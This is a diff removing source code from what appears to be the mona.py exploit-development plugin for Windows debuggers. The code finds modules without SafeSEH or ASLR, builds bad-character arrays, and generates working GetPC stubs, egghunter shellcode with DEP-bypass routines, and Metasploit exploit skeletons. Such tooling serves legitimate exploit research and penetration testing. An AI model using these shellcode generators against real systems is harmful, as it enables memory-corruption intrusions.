-            doManageBpOnFunc(modulecriteria,criteria,funcfilter,mode,type)
-            
-            return
-        
-        
-        # ----- Show info about modules -------#
-        def procModInfoS(args):
-            modulecriteria = {}
-            criteria = {}
-            modulecriteria["safeseh"] = False
-            dbg.log("Safeseh unprotected modules :")
-            modulestosearch = getModulesToQuery(modulecriteria)
-            showModuleTable("",modulestosearch)
-            return
-            
-        def procModInfoSA(args):
-            modulecriteria = {}
-            criteria = {}
-            modulecriteria["safeseh"] = False
-            modulecriteria["aslr"] = False
-            modulecriteria["rebase"] = False    
-            dbg.log("Safeseh unprotected, no aslr & no rebase modules :")
-            modulestosearch = getModulesToQuery(modulecriteria)
-            showModuleTable("",modulestosearch)         
-            return
-
-        def procModInfoA(args):
-            modulecriteria = {}
-            criteria = {}
-            modulecriteria["aslr"] = False
-            modulecriteria["rebase"] = False    
-            dbg.log("No aslr & no rebase modules :")            
-            modulestosearch = getModulesToQuery(modulecriteria)
-            showModuleTable("",modulestosearch)         
-            return
-            
-        # ----- Print byte array ----- #
-        
-        def procByteArray(args):
-            badchars = ""
-            forward = True
-            startval = 0
-            endval = 255
-            sign = 1
-            bytesperline = 32
-            if "b" in args:
-                dbg.log(" *** Note: parameter -b has been deprecated and replaced with -cpb ***")
-                if type(args["b"]).__name__.lower() != "bool":  
-                    if not "cpb" in args:
-                        args["cpb"] = args["b"]
-            if "r" in args:
-                forward = False
-                startval = -255
-                endval = 0
-                sign = -1
-            badchars = ""
-            if "cpb" in args:   
-                badchars = args["cpb"]
-            badchars = badchars.replace("'","")
-            badchars = badchars.replace('"',"")
-            badchars = badchars.replace("\\x","")
-            # see if we need to expand ..
-            bpos = 0
-            newbadchars = ""
-            while bpos < len(badchars):
-                curchar = badchars[bpos]+badchars[bpos+1]
-                if curchar == "..":
-                    pos = bpos
-                    if pos > 1 and pos <= len(badchars)-4:
-                        # get byte before and after ..
-                        bytebefore = badchars[pos-2] + badchars[pos-1]
-                        byteafter = badchars[pos+2] + badchars[pos+3]
-                        bbefore = int(bytebefore,16)
-                        bafter = int(byteafter,16)
-                        insertbytes = ""
-                        bbefore += 1
-                        while bbefore < bafter:
-                            insertbytes += "%02x" % bbefore
-                            bbefore += 1
-                        newbadchars += insertbytes
-                else:
-                    newbadchars += curchar
-                bpos += 2
-            badchars = newbadchars
-
-
-            cnt = 0
-            strb = ""
-            while cnt < len(badchars):
-                strb=strb+binascii.a2b_hex(badchars[cnt]+badchars[cnt+1])
-                cnt=cnt+2           
-            
-            dbg.log("Generating table, excluding %d bad chars..." % len(strb))
-            arraytable = []
-            binarray = ""
-            while startval <= endval:
-                thisval = startval * sign
-                hexbyte = hex(thisval)[2:]
-                binbyte = hex2bin(toHexByte(thisval))
-                if len(hexbyte) == 1:
-                    hexbyte = "0" + hexbyte
-                hexbyte2 = binascii.a2b_hex(hexbyte)
-                if not hexbyte2 in strb:
-                    arraytable.append(hexbyte)
-                    binarray += binbyte
-                startval += 1
-            dbg.log("Dumping table to file")
-            output = ""
-            cnt = 0
-            outputline = '"'
-            totalbytes = len(arraytable)
-            tablecnt = 0
-            while tablecnt < totalbytes:
-                if (cnt < bytesperline):
-                    outputline += "\\x" + arraytable[tablecnt]
-                else:
-                    outputline += '"\n'
-                    cnt = 0
-                    output += outputline
-                    outputline = '"\\x' + arraytable[tablecnt]
-                tablecnt += 1
-                cnt += 1
-            if (cnt-1) < bytesperline:
-                outputline += '"\n'
-            output += outputline
-            
-            global ignoremodules
-            ignoremodules = True
-            arrayfilename="bytearray.txt"
-            objarrayfile = MnLog(arrayfilename)
-            arrayfile = objarrayfile.reset()
-            binfilename = arrayfile.replace("bytearray.txt","bytearray.bin")
-            objarrayfile.write(output,arrayfile)
-            ignoremodules = False
-            dbg.logLines(output)
-            dbg.log("")
-            binfile = open(binfilename,"wb")
-            binfile.write(binarray)
-            binfile.close()
-            dbg.log("Done, wrote %d bytes to file %s" % (len(arraytable),arrayfile))
-            dbg.log("Binary output saved in %s" % binfilename)
-            return
-            
-            
-            
-            
-        #----- Read binary file, print 'nice' header -----#
-        def procPrintHeader(args):
-            alltypes = ["ruby","rb","python","py"]
-            thistype = "ruby"
-            filename = ""
-            typewrong = False
-            stopnow = False
-            if "f" in args:
-                if type(args["f"]).__name__.lower() != "bool":  
-                    filename = args["f"]
-            if "t" in args:
-                if type(args["t"]).__name__.lower() != "bool":
-                    if args["t"] in alltypes:
-                        thistype = args["t"]
-                    else:
-                        typewrong = True
-                else:
-                    typewrong = True
-
-            if typewrong:
-                dbg.log("Invalid type specified with option -t. Valid types are: %s" % alltypes,highlight=1)
-                stopnow = True
-            else:
-                if thistype == "rb":
-                    thistype = "ruby"
-                if thistype == "py":
-                    thistype = "python"
-
-            if filename == "":
-                dbg.log("Missing argument -f <source filename>",highlight=1)
-                stopnow = True
-
-            if stopnow:
-                return
-
-            filename = filename.replace("'","").replace('"',"")
-            content = ""
-            try:        
-                file = open(filename,"rb")
-                content = file.read()
-                file.close()
-            except:
-                dbg.log("Unable to read file %s" % filename,highlight=1)
-                return
-            dbg.log("Read %d bytes from %s" % (len(content),filename))  
-            dbg.log("Output type: %s" % thistype)
-            cnt = 0
-            linecnt = 0 
-            
-            output = ""
-            thisline = ""           
-            
-            max = len(content)
-            
-            addchar = "<<"
-            if thistype == "python":
-                addchar = "+="
-            
-            while cnt < max:
-
-                # first check for unicode
-                if cnt < max-1:
-                    if linecnt == 0:    
-                        thisline = "header = \""
-                    else:
-                        thisline = "header %s \"" % addchar
-                        
-                    thiscnt = cnt
-                    while cnt < max-1 and isAscii2(ord(content[cnt])) and ord(content[cnt+1]) == 0:
-                        if content[cnt] == "\\":
-                            thisline += "\\"
-                        if content[cnt] == "\"":
-                            thisline += "\\"
-                        thisline += "%s\\x00" % content[cnt]
-                        cnt += 2
-                    if thiscnt != cnt:
-                        output += thisline + "\"" + "\n"
-                        linecnt += 1
-                        
-                        
-                if linecnt == 0:
-                    thisline = "header = \""
-                else:
-                    thisline = "header %s \"" % addchar
-                thiscnt = cnt
-                
-                # ascii repetitions
-                reps = 1
-                startval = content[cnt]
-                if isAscii(ord(content[cnt])):
-                    while cnt < max-1:
-                        if startval == content[cnt+1]:
-                            reps += 1
-                            cnt += 1    
-                        else:
-                            break
-                    if reps > 1:
-                        if startval == "\\":
-                            startval += "\\"
-                        if startval == "\"":
-                            startval = "\\" + "\""  
-                        output += thisline + startval + "\" * " + str(reps) + "\n"
-                        cnt += 1
-                        linecnt += 1
-                        continue
-                        
-                if linecnt == 0:
-                    thisline = "header = \""
-                else:
-                    thisline = "header %s \"" % addchar
-                thiscnt = cnt
-                
-                # check for just ascii
-                while cnt < max and isAscii2(ord(content[cnt])):
-                    if cnt < max-1 and ord(content[cnt+1]) == 0:
-                        break
-                    if content[cnt] == "\\":
-                        thisline += "\\"
-                    if content[cnt] == "\"":
-                        thisline += "\\"            
-                    thisline += content[cnt]
-                    cnt += 1
-                    
-                    
-                if thiscnt != cnt:
-                    output += thisline + "\"" + "\n"
-                    linecnt += 1        
-                
-                #check others : repetitions
-                if cnt < max:
-                    if linecnt == 0:
-                        thisline = "header = \""
-                    else:
-                        thisline = "header %s \"" % addchar
-                    thiscnt = cnt
-                    while cnt < max:
-                        if isAscii2(ord(content[cnt])):
-                            break
-                        if cnt < max-1 and isAscii2(ord(content[cnt])) and ord(content[cnt+1]) == 0:
-                            break
-                        #check repetitions
-                        reps = 1
-                        startval = ord(content[cnt])
-                        while cnt < max-1:
-                            if startval == ord(content[cnt+1]):
-                                reps += 1
-                                cnt += 1    
-                            else:
-                                break
-                        if reps > 1:
-                            if len(thisline) > 12:
-                                output += thisline + "\"" + "\n"
-                            if linecnt == 0:
-                                thisline = "header = \"\\x" + "%02x\" * %d" % (startval,reps)
-                            else:
-                                thisline = "header %s \"\\x" % addchar 
-                                thisline += "%02x\" * %d" % (startval,reps)
-                            output += thisline + "\n"
-                            thisline = "header %s \"" % addchar
-                            linecnt += 1
-                        else:
-                            thisline += "\\x" + "%02x" % ord(content[cnt])  
-                        cnt += 1
-                    if thiscnt != cnt:
-                        if len(thisline) > 12:
-                            output += thisline + "\"" + "\n"
-                            linecnt += 1            
-
-            global ignoremodules
-            ignoremodules = True
-            headerfilename="header.txt"
-            objheaderfile = MnLog(headerfilename)
-            headerfile = objheaderfile.reset()
-            objheaderfile.write(output,headerfile)
-            ignoremodules = False
-            if not silent:
-                dbg.log("-" * 30)
-                dbg.logLines(output)
-                dbg.log("-" * 30)           
-            dbg.log("Wrote header to %s" % headerfile)
-            return
-        
-        #----- Update -----#
-        
-        def procUpdate(args):
-            """
-            Function to update mona and optionally windbglib to the latest version
-            
-            Arguments : none
-            
-            Returns : new version of mona/windbglib (if available)
-            """
-
-            updateproto = "https"
-            #if "http" in args:
-            #   updateproto  = "http"
-            
-            #debugger version   
-            imversion = __IMM__
-            #url
-            dbg.setStatusBar("Running update process...")
-            dbg.updateLog()
-            updateurl = "https://github.com/corelan/mona/raw/master/mona.py"
-            
-            #if updateproto == "http":
-            #   updateurl = "http://redmine.corelan.be/projects/mona/repository/git/revisions/master/raw/mona.py"
-            
-            currentversion,currentrevision = getVersionInfo(inspect.stack()[0][1])
-            u = ""
-            try:
-                u = urllib.urlretrieve(updateurl)
-                newversion,newrevision = getVersionInfo(u[0])
-                if newversion != "" and newrevision != "":
-                    dbg.log("[+] Version compare :")
-                    dbg.log("    Current Version : %s, Current Revision : %s" % (currentversion,currentrevision))
-                    dbg.log("    Latest Version : %s, Latest Revision : %s" % (newversion,newrevision))
-                else:
-                    dbg.log("[-] Unable to check latest version (corrupted file ?), try again later",highlight=1)
-                    return
-            except:
-                dbg.log("[-] Unable to check latest version (download error), run !mona update -http or try again later",highlight=1)
-                return
-            #check versions
-            doupdate = False
-            if newversion != "" and newrevision != "":
-                if currentversion != newversion:
-                    doupdate = True
-                else:
-                    if int(currentrevision) < int(newrevision):
-                        doupdate = True
-                
-            if doupdate:
-                dbg.log("[+] New version available",highlight=1)
-                dbg.log("    Updating to %s r%s" % (newversion,newrevision),highlight=1)
-                try:
-                    shutil.copyfile(u[0],inspect.stack()[0][1])
-                    dbg.log("    Done")                 
-                except:
-                    dbg.log("    ** Unable to update mona.py",highlight=1)
-                currentversion,currentrevision = getVersionInfo(inspect.stack()[0][1])
-                dbg.log("[+] Current version : %s r%s" % (currentversion,currentrevision))
-            else:
-                dbg.log("[+] You are running the latest version")
-
-            # update windbglib if needed
-            if __DEBUGGERAPP__ == "WinDBG":
-                dbg.log("[+] Locating windbglib path")
-                paths = sys.path
-                filefound = False
-                libfile = ""
-                for ppath in paths:
-                    libfile = ppath + "\\windbglib.py"
-                    if os.path.isfile(libfile):
-                        filefound=True
-                        break
-                if not filefound:
-                    dbg.log("    ** Unable to find windbglib.py ! **")
-                else:
-                    dbg.log("[+] Checking if %s needs an update..." % libfile)
-                    updateurl = "https://github.com/corelan/windbglib/raw/master/windbglib.py"
-                    #if updateproto == "http":
-                    #   updateurl = updateproto + "://redmine.corelan.be/projects/windbglib/repository/raw/windbglib.py"
-                    currentversion,currentrevision = getVersionInfo(libfile)
-                    u = ""
-                    try:
-                        u = urllib.urlretrieve(updateurl)
-                        newversion,newrevision = getVersionInfo(u[0])
-                        if newversion != "" and newrevision != "":
-                            dbg.log("[+] Version compare :")
-                            dbg.log("    Current Version : %s, Current Revision : %s" % (currentversion,currentrevision))
-                            dbg.log("    Latest Version : %s, Latest Revision : %s" % (newversion,newrevision))
-                        else:
-                            dbg.log("[-] Unable to check latest version (corrupted file ?), try again later",highlight=1)
-                            return
-                    except:
-                        dbg.log("[-] Unable to check latest version (download error), run !mona update -http or try again later",highlight=1)
-                        return
-
-                    #check versions
-                    doupdate = False
-                    if newversion != "" and newrevision != "":
-                        if currentversion != newversion:
-                            doupdate = True
-                        else:
-                            if int(currentrevision) < int(newrevision):
-                                doupdate = True
-                        
-                    if doupdate:
-                        dbg.log("[+] New version available",highlight=1)
-                        dbg.log("    Updating to %s r%s" % (newversion,newrevision),highlight=1) 
-                        try:
-                            shutil.copyfile(u[0],libfile)
-                            dbg.log("    Done")                 
-                        except:
-                            dbg.log("    ** Unable to update windbglib.py",highlight=1)
-                        currentversion,currentrevision = getVersionInfo(libfile)
-                        dbg.log("[+] Current version : %s r%s" % (currentversion,currentrevision))
-                    else:
-                        dbg.log("[+] You are running the latest version")
-
-            dbg.setStatusBar("Done.")
-            return
-            
-        #----- GetPC -----#
-        def procgetPC(args):
-            r32 = ""
-            output = ""
-            if "r" in args:
-                if type(args["r"]).__name__.lower() != "bool":  
-                    r32 = args["r"].lower()
-                          
-            if r32 == "" or not "r" in args:
-                dbg.log("Missing argument -r <register>",highlight=1)
-                return
-
-            opcodes = {}
-            opcodes["eax"] = "\\x58"
-            opcodes["ecx"] = "\\x59"
-            opcodes["edx"] = "\\x5a"
-            opcodes["ebx"] = "\\x5b"                
-            opcodes["esp"] = "\\x5c"
-            opcodes["ebp"] = "\\x5d"
-            opcodes["esi"] = "\\x5e"
-            opcodes["edi"] = "\\x5f"
-
-            calls = {}
-            calls["eax"] = "\\xd0"
-            calls["ecx"] = "\\xd1"
-            calls["edx"] = "\\xd2"
-            calls["ebx"] = "\\xd3"              
-            calls["esp"] = "\\xd4"
-            calls["ebp"] = "\\xd5"
-            calls["esi"] = "\\xd6"
-            calls["edi"] = "\\xd7"
-            
-            output  = "\n" + r32 + "|  jmp short back:\n\"\\xeb\\x03" + opcodes[r32] + "\\xff" + calls[r32] + "\\xe8\\xf8\\xff\\xff\\xff\"\n"
-            output += r32 + "|  call + 4:\n\"\\xe8\\xff\\xff\\xff\\xff\\xc3" + opcodes[r32] + "\"\n"
-            output += r32 + "|  fstenv:\n\"\\xd9\\xeb\\x9b\\xd9\\x74\\x24\\xf4" + opcodes[r32] + "\"\n"
-                        
-            global ignoremodules
-            ignoremodules = True
-            getpcfilename="getpc.txt"
-            objgetpcfile = MnLog(getpcfilename)
-            getpcfile = objgetpcfile.reset()
-            objgetpcfile.write(output,getpcfile)
-            ignoremodules = False
-            dbg.logLines(output)
-            dbg.log("")         
-            dbg.log("Wrote to file %s" % getpcfile)
-            return      
-
-            
-        #----- Egghunter -----#
-        def procEgg(args):
-            filename = ""
-            egg = "w00t"
-            usechecksum = False
-            usewow64 = False
-            useboth = False
-            egg_size = 0
-            checksumbyte = ""
-            extratext = ""
-            
-            global silent
-            oldsilent = silent
-            silent = True           
-            
-            if "f" in args:
-                if type(args["f"]).__name__.lower() != "bool":
-                    filename = args["f"]
-            filename = filename.replace("'", "").replace("\"", "")                  
-
-            #Set egg
-            if "t" in args:
-                if type(args["t"]).__name__.lower() != "bool":
-                    egg = args["t"]
-
-            if "wow64" in args:
-                usewow64 = True
-
-
-            # placeholder for later
-            if "both" in args:
-                useboth = True
-
-            if len(egg) != 4:
-                egg = 'w00t'
-            dbg.log("[+] Egg set to %s" % egg)
-            
-            if "c" in args:
-                if filename != "":
-                    usechecksum = True
-                    dbg.log("[+] Hunter will include checksum routine")
-                else:
-                    dbg.log("Option -c only works in conjunction with -f <filename>",highlight=1)
-                    return
-            
-            startreg = ""
-            if "startreg" in args:
-                if isReg(args["startreg"]):
-                    startreg = args["startreg"].lower()
-                    dbg.log("[+] Egg will start search at %s" % startreg)
-            
-                    
-            depmethods = ["virtualprotect","copy","copy_size"]
-            depreg = "esi"
-            depsize = 0
-            freeregs = [ "ebx","ecx","ebp","esi" ]
-            
-            regsx = {}
-            # 0 : mov xX
-            # 1 : push xX
-            # 2 : mov xL
-            # 3 : mov xH
-            #
-            regsx["eax"] = ["\x66\xb8","\x66\x50","\xb0","\xb4"]
-            regsx["ebx"] = ["\x66\xbb","\x66\x53","\xb3","\xb7"]
-            regsx["ecx"] = ["\x66\xb9","\x66\x51","\xb1","\xb5"]
-            regsx["edx"] = ["\x66\xba","\x66\x52","\xb2","\xb6"]
-            regsx["esi"] = ["\x66\xbe","\x66\x56"]
-            regsx["edi"] = ["\x66\xbf","\x66\x57"]
-            regsx["ebp"] = ["\x66\xbd","\x66\x55"]
-            regsx["esp"] = ["\x66\xbc","\x66\x54"]
-            
-            addreg = {}
-            addreg["eax"] = "\x83\xc0"
-            addreg["ebx"] = "\x83\xc3"          
-            addreg["ecx"] = "\x83\xc1"
-            addreg["edx"] = "\x83\xc2"
-            addreg["esi"] = "\x83\xc6"
-            addreg["edi"] = "\x83\xc7"
-            addreg["ebp"] = "\x83\xc5"          
-            addreg["esp"] = "\x83\xc4"
-            
-            depdest = ""
-            depmethod = ""
-            
-            getpointer = ""
-            getsize = ""
-            getpc = ""
-            
-            jmppayload = "\xff\xe7"
-            
-            if "depmethod" in args:
-                if args["depmethod"].lower() in depmethods:
-                    depmethod = args["depmethod"].lower()
-                    dbg.log("[+] Hunter will include routine to bypass DEP on found shellcode")
-                    # other DEP related arguments ?
-                    # depreg
-                    # depdest
-                    # depsize
-                if "depreg" in args:
-                    if isReg(args["depreg"]):
-                        depreg = args["depreg"].lower()
-                if "depdest" in args:
-                    if isReg(args["depdest"]):
-                        depdest = args["depdest"].lower()
-                if "depsize" in args:
-                    try:
-                        depsize = int(args["depsize"])
-                    except:
-                        dbg.log(" ** Invalid depsize",highlight=1)
-                        return
-            
-            
-            #read payload file
-            data = ""
-            if filename != "":
-                try:
-                    f = open(filename, "rb")
-                    data = f.read()
-                    f.close()
-                    dbg.log("[+] Read payload file (%d bytes)" % len(data))
-                except:
-                    dbg.log("Unable to read file %s" %filename, highlight=1)
-                    return
-
-                    
-            #let's start        
-            egghunter = ""
-
-            if not usewow64:
-                #Basic version of egghunter
-                dbg.log("[+] Generating traditional 32bit egghunter code")
-                egghunter = ""
-                egghunter += (
-                    "\x66\x81\xca\xff\x0f"+ #or dx,0xfff
-                    "\x42"+                 #INC EDX
-                    "\x52"                  #push edx
-                    "\x6a\x02"              #push 2 (NtAccessCheckAndAuditAlarm syscall)
-                    "\x58"                  #pop eax
-                    "\xcd\x2e"              #int 0x2e 
-                    "\x3c\x05"              #cmp al,5
-                    "\x5a"                  #pop edx
-                    "\x74\xef"              #je "or dx,0xfff"
-                    "\xb8"+egg+             #mov eax, egg
-                    "\x8b\xfa"              #mov edi,edx
-                    "\xaf"                  #scasd
-                    "\x75\xea"              #jne "inc edx"
-                    "\xaf"                  #scasd
-                    "\x75\xe7"              #jne "inc edx"
-                )
-
-            if usewow64:
-                egghunter = ""
-                egghunter += (
-                    # 64 stub needed before loop
-                    "\x31\xdb"                                      #xor ebx,ebx
-                    "\x53"                                          #push ebx
-                    "\x53"                                          #push ebx
-                    "\x53"                                          #push ebx
-                    "\x53"                                          #push ebx
-                    "\xb3\xc0"                                      #mov bl,0xc0
-    
-                    # 64 Loop
-                    "\x66\x81\xCA\xFF\x0F"                          #OR DX,0FFF
-                    "\x42"                                          #INC EDX
-                    "\x52"                                          #PUSH EDX
-                    "\x6A\x26"                                      #PUSH 26 
-                    "\x58"                                          #POP EAX
-                    "\x33\xC9"                                      #XOR ECX,ECX
-                    "\x8B\xD4"                                      #MOV EDX,ESP
-                    "\x64\xff\x13"                                  #CALL DWORD PTR FS:[ebx]
-                    "\x5e"                                          #POP ESI
-                    "\x5a"                                          #POP EDX
-                    "\x3C\x05"                                      #CMP AL,5
-                    "\x74\xe9"                                      #JE SHORT
-                    "\xB8"+egg+                                     #MOV EAX,74303077 w00t
-                    "\x8B\xFA"                                      #MOV EDI,EDX
-                    "\xAF"                                          #SCAS DWORD PTR ES:[EDI]
-                    "\x75\xe4"                                      #JNZ "inc edx"
-                    "\xAF"                                          #SCAS DWORD PTR ES:[EDI]
-                    "\x75\xe1"                                      #JNZ "inc edx"
-                )
-            
-            if usechecksum:
-                dbg.log("[+] Generating checksum routine")
-                extratext = "+ checksum routine"
-                egg_size = ""
-                if len(data) < 256:
-                    cmp_reg = "\x80\xf9"    #cmp cl,value
-                    egg_size = hex2bin("%x" % len(data))
-                    offset1 = "\xf7"
-                    offset2 = "\xd3"
-                elif len(data) < 65536:
-                    cmp_reg = "\x66\x81\xf9"    #cmp cx,value
-                    #avoid nulls
-                    egg_size_normal = "%04X" % len(data)
-                    while egg_size_normal[0:2] == "00" or egg_size_normal[2:4] == "00":
-                        data += "\x90"
-                        egg_size_normal = "%04X" % len(data)
-                    egg_size = hex2bin(egg_size_normal[2:4]) + hex2bin(egg_size_normal[0:2])
-                    offset1 = "\xf5"
-                    offset2 = "\xd1"
-                else:
-                    dbg.log("Cannot use checksum code with this payload size (way too big)",highlight=1)
-                    return
-                    
-                sum = 0
-                for byte in data:
-                    sum += ord(byte)
-                sumstr= toHex(sum)
-                checksumbyte = sumstr[len(sumstr)-2:len(sumstr)]
-
-                egghunter += (
-                    "\x51"                      #push ecx
-                    "\x31\xc9"                  #xor ecx,ecx
-                    "\x31\xc0"                  #xor eax,eax
-                    "\x02\x04\x0f"              #add al,byte [edi+ecx]
-                    "\x41"+                     #inc ecx
-                    cmp_reg + egg_size +        #cmp cx/cl, value
-                    "\x75" + offset1 +          #jnz "add al,byte [edi+ecx]
-                    "\x3a\x04\x39" +            #cmp al,byte [edi+ecx]
-                    "\x59" +                    #pop ecx
-                    "\x75" + offset2            #jnz "inc edx"
-                )       
-
-            #dep bypass ?
-            if depmethod != "":
-                dbg.log("[+] Generating dep bypass routine")
-            
-                if not depreg in freeregs:
-                    getpointer += "mov " + freeregs[0] +"," + depreg + "#"
-                    depreg = freeregs[0]
-                
-                freeregs.remove(depreg)
-                if depmethod == "copy" or depmethod == "copy_size":
-                    if depdest != "":
-                        if not depdest in freeregs:
-                            getpointer += "mov " + freeregs[0] + "," + depdest + "#"
-                            depdest = freeregs[0]
-                    else:
-                        getpc = "\xd9\xee"          # fldz
-                        getpc += "\xd9\x74\xe4\xf4" # fstenv [esp-0c]
-                        depdest = freeregs[0]
-                        getpc += hex2bin(assemble("pop "+depdest))
-                    
-                    freeregs.remove(depdest)
-                
-                sizereg = freeregs[0]
-                
-                if depsize == 0:
-                    # set depsize to payload * 2 if we are using a file
-                    depsize = len(data) * 2
-                    if depmethod == "copy_size":
-                        depsize = len(data)
-                    
-                if depsize == 0:
-                    dbg.log("** Please specify a valid -depsize when you are not using -f **",highlight=1)
-                    return
-                else:
-                    if depsize <= 127:
-                        #simply push it to the stack
-                        getsize = "\x6a" + hex2bin("\\x" + toHexByte(depsize))
-                    else:
-                        #can we do it with 16bit reg, no nulls ?
-                        if depsize <= 65535:
-                            sizeparam = toHex(depsize)[4:8]
-                            getsize = hex2bin(assemble("xor "+sizereg+","+sizereg))
-                            if not (sizeparam[0:2] == "00" or sizeparam[2:4] == "00"):
-                                #no nulls, hooray, write to xX
-                                getsize += regsx[sizereg][0]+hex2bin("\\x" + sizeparam[2:4] + "\\x" + sizeparam[0:2])
-                            else:
-                                # write the non null if we can
-                                if len(regsx[sizereg]) > 2:
-                                    if not (sizeparam[0:2] == "00"):
-                                        # write to xH
-                                        getsize += regsx[sizereg][3] + hex2bin("\\x" + sizeparam[0:2])
-                                    if not (sizeparam[2:4] == "00"):
-                                        # write to xL
-                                        getsize += regsx[sizereg][2] + hex2bin("\\x" + sizeparam[2:4])
-                                else:
-                                    #we have to write the full value to sizereg
-                                    blockcnt = 0
-                                    vpsize = 0
-                                    blocksize = depsize
-                                    while blocksize >= 127:
-                                        blocksize = blocksize / 2
-                                        blockcnt += 1
-                                    if blockcnt > 0:
-                                        getsize += addreg[sizereg] + hex2bin("\\x" + toHexByte(blocksize))
-                                        vpsize = blocksize
-                                        depblockcnt = 0
-                                        while depblockcnt < blockcnt:
-                                            getsize += hex2bin(assemble("add "+sizereg+","+sizereg))
-                                            vpsize += vpsize
-                                            depblockcnt += 1
-                                        delta = depsize - vpsize
-                                        if delta > 0:
-                                            getsize += addreg[sizereg] + hex2bin("\\x" + toHexByte(delta))
-                                    else:
-                                        getsize += addreg[sizereg] + hex2bin("\\x" + toHexByte(depsize))
-                                # finally push
-                            getsize += hex2bin(assemble("push "+ sizereg))
-                                
-                        else:
-                            dbg.log("** Shellcode size (depsize) is too big",highlight=1)
-                            return
-                        
-                #finish it off
-                if depmethod == "virtualprotect":
-                    jmppayload = "\x54\x6a\x40"
-                    jmppayload += getsize
-                    jmppayload += hex2bin(assemble("#push edi#push edi#push "+depreg+"#ret"))
-                elif depmethod == "copy":
-                    jmppayload = hex2bin(assemble("push edi\push "+depdest+"#push "+depdest+"#push "+depreg+"#mov edi,"+depdest+"#ret"))
-                elif depmethod == "copy_size":
-                    jmppayload += getsize
-                    jmppayload += hex2bin(assemble("push edi#push "+depdest+"#push " + depdest + "#push "+depreg+"#mov edi,"+depdest+"#ret"))
-                
-        
-            #jmp to payload
-            egghunter += getpc
-            egghunter += jmppayload
-            
-            startat = ""
-            skip = ""
-            
-            #start at a certain reg ?
-            if startreg != "":
-                if startreg != "edx":
-                    startat = hex2bin(assemble("mov edx," + startreg))
-                skip = "\xeb\x05"
-            
-            egghunter = skip + egghunter
-            #pickup pointer for DEP bypass ?
-            egghunter = hex2bin(assemble(getpointer)) + egghunter
-            
-            egghunter = startat + egghunter
-            
-            silent = oldsilent          
-            
-            #Convert binary to printable hex format
-            egghunter_hex = toniceHex(egghunter.strip().replace(" ",""),16)
-                    
-            global ignoremodules
-            ignoremodules = True
-            hunterfilename="egghunter.txt"
-            objegghunterfile = MnLog(hunterfilename)
-            egghunterfile = objegghunterfile.reset()                        
-
-            dbg.log("[+] Egghunter %s (%d bytes): " % (extratext,len(egghunter.strip().replace(" ",""))))
-            dbg.logLines("%s" % egghunter_hex)
-            
-            objegghunterfile.write("Egghunter " + extratext + ", tag " + egg + " : ",egghunterfile)
-            objegghunterfile.write(egghunter_hex,egghunterfile)         
-
-            if filename == "":
-                objegghunterfile.write("Put this tag in front of your shellcode : " + egg + egg,egghunterfile)
-            else:
-                dbg.log("[+] Shellcode, with tag : ")           
-                block = "\"" + egg + egg + "\"\n"
-                cnt = 0
-                flip = 1
-                thisline = "\""
-                while cnt < len(data):
-                    thisline += "\\x%s" % toHexByte(ord(data[cnt]))             
-                    if (flip == 32) or (cnt == len(data)-1):
-                        if cnt == len(data)-1 and checksumbyte != "":
-                            thisline += "\\x%s" % checksumbyte                  
-                        thisline += "\""
-                        flip = 0
-                        block += thisline 
-                        block += "\n"
-                        thisline = "\""
-                    cnt += 1
-                    flip += 1
-                dbg.logLines(block) 
-                objegghunterfile.write("\nShellcode, with tag :\n",egghunterfile)
-                objegghunterfile.write(block,egghunterfile) 
-        
-            ignoremodules = False
-                    
-            return
-        
-        #----- Find MSP ------ #
-        
-        def procFindMSP(args):
-            distance = 0
-            
-            if "distance" in args:
-                try:
-                    distance = int(args["distance"])
-                except:
-                    distance = 0
-            if distance < 0:
-                dbg.log("** Please provide a positive number as distance",highlight=1)
-                return
-            mspresults = {}
-            mspresults = goFindMSP(distance,args)
-            return
-            
-        def procSuggest(args):
-            modulecriteria={}
-            criteria={}
-            modulecriteria,criteria = args2criteria(args,modulecriteria,criteria)
-            isEIP = False
-            isSEH = False
-            isEIPUnicode = False
-            isSEHUnicode = False
-            initialoffsetSEH = 0
-            initialoffsetEIP = 0
-            shellcodesizeSEH = 0
-            shellcodesizeEIP = 0
-            nullsallowed = True
-            
-            global ignoremodules
-            global noheader
-            global ptr_to_get
-            global silent
-            global ptr_counter
-            
-            targetstr = ""
-            exploitstr = ""
-            originalauthor = ""
-            url = ""
-            
-            #are we attached to an application ?
-            if dbg.getDebuggedPid() == 0:
-                dbg.log("** You don't seem to be attached to an application ! **",highlight=1)
-                return
-
-            exploittype = ""
-            skeletonarg = ""
-            usecliargs = False
-            validstypes ={}
-            validstypes["tcpclient"] = "network client (tcp)"
-            validstypes["udpclient"] = "network client (udp)"
-            validstypes["fileformat"] = "fileformat"
-            exploittypes = [ "fileformat","network client (tcp)","network client (udp)" ]
-            if __DEBUGGERAPP__ == "WinDBG" or "t" in args:
-                if "t" in args:
-                    if type(args["t"]).__name__.lower() != "bool":
-                        skeltype = args["t"].lower()
-                        skelparts = skeltype.split(":")
-                        if skelparts[0] in validstypes:
-                            exploittype = validstypes[skelparts[0]]
-                            if len(skelparts) > 1:
-                                skeletonarg = skelparts[1]
-                            else:
-                                dbg.log(" ** Please specify the skeleton type AND an argument. **")
-                                return
-                            usecliargs = True
-                        else:
-                            dbg.log(" ** Please specify a valid skeleton type and an argument. **")
-                            return                          
-                    else:
-                        dbg.log(" ** Please specify a skeletontype using -t **",highlight=1)
-                        return
-                else:
-                    dbg.log(" ** Please specify a skeletontype using -t **",highlight=1)
-                    return
-
-            mspresults = {}
-            mspresults = goFindMSP(100,args)
-
-            #create metasploit skeleton file
-            exploitfilename="exploit.rb"
-            objexploitfile = MnLog(exploitfilename)
-
-            #ptr_to_get = 5             
-            noheader = True
-            ignoremodules = True
-            exploitfile = objexploitfile.reset()            
-            ignoremodules = False
-            noheader = False
-            
-            dbg.log(" ")
-            dbg.log("[+] Preparing payload...")
-            dbg.log(" ")            
-            dbg.updateLog()
-            #what options do we have ?
-            # 0 : pointer
-            # 1 : offset
-            # 2 : type
-            
-            if "registers" in mspresults:
-                for reg in mspresults["registers"]:
-                    if reg.upper() == "EIP":
-                        isEIP = True
-                        eipval = mspresults["registers"][reg][0]
-                        ptrx = MnPointer(eipval)
-                        initialoffsetEIP = mspresults["registers"][reg][1]
-                        
-            # 0 : pointer
-            # 1 : offset
-            # 2 : type
-            # 3 : size
-            if "seh" in mspresults:
-                if len(mspresults["seh"]) > 0:
-                    isSEH = True
-                    for seh in mspresults["seh"]:
-                        if mspresults["seh"][seh][2] == "unicode":
-                            isSEHUnicode = True
-                        if not isSEHUnicode:
-                            initialoffsetSEH = mspresults["seh"][seh][1]
-                        else:
-                            initialoffsetSEH = mspresults["seh"][seh][1]
